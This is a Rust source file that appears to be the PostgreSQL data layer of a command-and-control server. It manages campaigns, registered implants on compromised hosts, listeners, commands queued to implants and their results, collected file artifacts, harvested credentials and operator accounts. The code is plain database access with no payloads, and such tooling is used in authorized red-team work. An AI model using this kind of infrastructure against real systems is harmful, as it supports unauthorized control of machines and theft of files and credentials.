use crate::models::listener::Listener;
use crate::models::{Artifact, Campaign, Command, CommandResult, Credential, Implant};
use anyhow::Result;
use sqlx::{PgPool, Row};
use uuid::Uuid;

pub struct Database {
    pool: PgPool,
}

impl Database {
    pub fn new(pool: PgPool) -> Self {
        Self { pool }
    }

    /// Get a reference to the underlying database connection pool.
    #[allow(dead_code)]
    pub fn pool(&self) -> &PgPool {
        &self.pool
    }

    // --- Campaign Operations ---
    pub async fn create_campaign(&self, name: &str, description: &str) -> Result<Campaign> {
        let rec = sqlx::query_as::<_, Campaign>(
            "INSERT INTO campaigns (name, description, status) VALUES ($1, $2, 'active') RETURNING id, name, description, status, start_date, end_date, created_at"
        )
        .bind(name)
        .bind(description)
        .fetch_one(&self.pool)
        .await?;

        Ok(rec)
    }

    pub async fn list_campaigns(&self) -> Result<Vec<Campaign>> {
        let recs = sqlx::query_as::<_, Campaign>(
            "SELECT id, name, description, status, start_date, end_date, created_at FROM campaigns ORDER BY created_at DESC"
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(recs)
    }

    pub async fn get_campaign(&self, id: Uuid) -> Result<Campaign> {
        let rec = sqlx::query_as::<_, Campaign>(
            "SELECT id, name, description, status, start_date, end_date, created_at FROM campaigns WHERE id = $1"
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;

        Ok(rec)
    }

    pub async fn update_campaign(
        &self,
        id: Uuid,
        name: Option<&str>,
        description: Option<&str>,
        status: Option<&str>,
    ) -> Result<Campaign> {
        // Build dynamic query or just update fields if present. For simplicity, let's update all provided fields.
        // This is a bit simplified; a real implementation might be more granular.
        let mut query_builder = sqlx::QueryBuilder::new("UPDATE campaigns SET ");
        let mut separated = query_builder.separated(", ");

        if let Some(n) = name {
            separated.push("name = ");
            separated.push_bind_unseparated(n);
        }
        if let Some(d) = description {
            separated.push("description = ");
            separated.push_bind_unseparated(d);
        }
        if let Some(s) = status {
            separated.push("status = ");
            separated.push_bind_unseparated(s);
        }

        query_builder.push(" WHERE id = ");
        query_builder.push_bind(id);
        query_builder
            .push(" RETURNING id, name, description, status, start_date, end_date, created_at");

        let rec = query_builder
            .build_query_as::<Campaign>()
            .fetch_one(&self.pool)
            .await?;

        Ok(rec)
    }

    // --- Implant Operations ---
    pub async fn register_implant(&self, implant: &Implant) -> Result<Uuid> {
        let row = sqlx::query(
            "INSERT INTO implants (campaign_id, hostname, internal_ip, external_ip, os_type, os_version, architecture, username, domain, privileges, implant_version, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, 'active') RETURNING id"
        )
        .bind(implant.campaign_id)
        .bind(&implant.hostname)
        .bind(implant.internal_ip)
        .bind(implant.external_ip)
        .bind(&implant.os_type)
        .bind(&implant.os_version)
        .bind(&implant.architecture)
        .bind(&implant.username)
        .bind(&implant.domain)
        .bind(&implant.privileges)
        .bind(&implant.implant_version)
        .fetch_one(&self.pool)
        .await?;

        Ok(row.try_get("id")?)
    }

    pub async fn update_implant_checkin(&self, id: Uuid) -> Result<()> {
        sqlx::query("UPDATE implants SET last_checkin = NOW() WHERE id = $1")
            .bind(id)
            .execute(&self.pool)
            .await?;
        Ok(())
    }

    pub async fn list_implants(&self) -> Result<Vec<Implant>> {
        let recs = sqlx::query_as::<_, Implant>(
            "SELECT * FROM implants ORDER BY last_checkin DESC NULLS LAST",
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(recs)
    }

    pub async fn get_implant(&self, id: Uuid) -> Result<Implant> {
        let rec = sqlx::query_as::<_, Implant>("SELECT * FROM implants WHERE id = $1")
            .bind(id)
            .fetch_one(&self.pool)
            .await?;
        Ok(rec)
    }

    pub async fn kill_implant(&self, id: Uuid) -> Result<()> {
        sqlx::query("UPDATE implants SET status = 'killed' WHERE id = $1")
            .bind(id)
            .execute(&self.pool)
            .await?;
        Ok(())
    }

    // --- Listener Operations ---
    pub async fn create_listener(
        &self,
        name: &str,
        l_type: &str,
        bind_addr: &str,
        config: serde_json::Value,
    ) -> Result<Listener> {
        let rec = sqlx::query_as::<_, Listener>(
            "INSERT INTO listeners (name, type, bind_address, config, status) VALUES ($1, $2, $3::inet, $4, 'active') RETURNING id, name, type, bind_address::text, config, status"
        )
        .bind(name)
        .bind(l_type)
        .bind(bind_addr)
        .bind(config)
        .fetch_one(&self.pool)
        .await?;
        Ok(rec)
    }

    pub async fn list_listeners(&self) -> Result<Vec<Listener>> {
        let recs = sqlx::query_as::<_, Listener>(
            "SELECT id, name, type, bind_address::text, config, status FROM listeners ORDER BY name"
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(recs)
    }

    pub async fn update_listener_status(&self, id: Uuid, status: &str) -> Result<()> {
        sqlx::query("UPDATE listeners SET status = $1 WHERE id = $2")
            .bind(status)
            .bind(id)
            .execute(&self.pool)
            .await?;
        Ok(())
    }

    // --- Command Operations ---
    pub async fn queue_command(
        &self,
        implant_id: Uuid,
        cmd_type: &str,
        payload: &[u8],
    ) -> Result<Uuid> {
        let row = sqlx::query(
            "INSERT INTO commands (implant_id, command_type, payload, status) VALUES ($1, $2, $3, 'pending') RETURNING id"
        )
        .bind(implant_id)
        .bind(cmd_type)
        .bind(payload)
        .fetch_one(&self.pool)
        .await?;

        Ok(row.try_get("id")?)
    }

    pub async fn get_pending_commands(&self, implant_id: Uuid) -> Result<Vec<Command>> {
        let recs = sqlx::query_as::<_, Command>(
            "UPDATE commands SET status = 'sent', sent_at = NOW() WHERE id IN (SELECT id FROM commands WHERE implant_id = $1 AND status = 'pending' ORDER BY priority ASC, created_at ASC FOR UPDATE SKIP LOCKED) RETURNING *"
        )
        .bind(implant_id)
        .fetch_all(&self.pool)
        .await?;
        Ok(recs)
    }

    pub async fn update_command_result(&self, command_id: Uuid, output: &[u8]) -> Result<()> {
        let mut tx = self.pool.begin().await?;

        sqlx::query("UPDATE commands SET status = 'completed', completed_at = NOW() WHERE id = $1")
            .bind(command_id)
            .execute(&mut *tx)
            .await?;

        sqlx::query("INSERT INTO command_results (command_id, output) VALUES ($1, $2)")
            .bind(command_id)
            .bind(output)
            .execute(&mut *tx)
            .await?;

        tx.commit().await?;
        Ok(())
    }

    pub async fn list_commands(&self, implant_id: Uuid) -> Result<Vec<Command>> {
        let recs = sqlx::query_as::<_, Command>(
            "SELECT * FROM commands WHERE implant_id = $1 ORDER BY created_at DESC",
        )
        .bind(implant_id)
        .fetch_all(&self.pool)
        .await?;
        Ok(recs)
    }

    pub async fn cancel_command(&self, command_id: Uuid) -> Result<()> {
        sqlx::query(
            "UPDATE commands SET status = 'cancelled' WHERE id = $1 AND status = 'pending'",
        )
        .bind(command_id)
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn get_command_result(&self, command_id: Uuid) -> Result<Option<CommandResult>> {
        let rec = sqlx::query_as::<_, CommandResult>(
            "SELECT * FROM command_results WHERE command_id = $1",
        )
        .bind(command_id)
        .fetch_optional(&self.pool)
        .await?;
        Ok(rec)
    }

    // --- Artifact Operations ---
    pub async fn list_artifacts(&self) -> Result<Vec<Artifact>> {
        let recs = sqlx::query_as::<_, Artifact>(
            "SELECT id, implant_id, command_id, filename, original_path, file_hash_sha256, file_hash_blake3, file_size, mime_type, collected_at, metadata, NULL as content FROM artifacts ORDER BY collected_at DESC"
        )
        .fetch_all(&self.pool)
        .await?;
        Ok(recs)
    }

    pub async fn get_artifact(&self, id: Uuid) -> Result<Artifact> {
        let rec = sqlx::query_as::<_, Artifact>("SELECT * FROM artifacts WHERE id = $1")
            .bind(id)
            .fetch_one(&self.pool)
            .await?;
        Ok(rec)
    }

    pub async fn create_artifact(
        &self,
        implant_id: Uuid,
        filename: &str,
        content: &[u8],
    ) -> Result<Uuid> {
        let row = sqlx::query(
            "INSERT INTO artifacts (implant_id, filename, content, collected_at) VALUES ($1, $2, $3, NOW()) RETURNING id"
        )
        .bind(implant_id)
        .bind(filename)
        .bind(content)
        .fetch_one(&self.pool)
        .await?;
        Ok(row.try_get("id")?)
    }

    // --- Credential Operations ---
    pub async fn list_credentials(&self) -> Result<Vec<Credential>> {
        let recs =
            sqlx::query_as::<_, Credential>("SELECT * FROM credentials ORDER BY collected_at DESC")
                .fetch_all(&self.pool)
                .await?;
        Ok(recs)
    }

    // --- Operator Operations ---
    pub async fn get_operator_by_username(
        &self,
        username: &str,
    ) -> Result<Option<crate::models::Operator>> {
        let rec = sqlx::query_as::<_, crate::models::Operator>(
            "SELECT * FROM operators WHERE username = $1",
        )
        .bind(username)
        .fetch_optional(&self.pool)
        .await?;
        Ok(rec)
    }

    pub async fn get_operator(&self, id: Uuid) -> Result<Option<crate::models::Operator>> {
        let rec =
            sqlx::query_as::<_, crate::models::Operator>("SELECT * FROM operators WHERE id = $1")
                .bind(id)
                .fetch_optional(&self.pool)
                .await?;
        Ok(rec)
    }
}
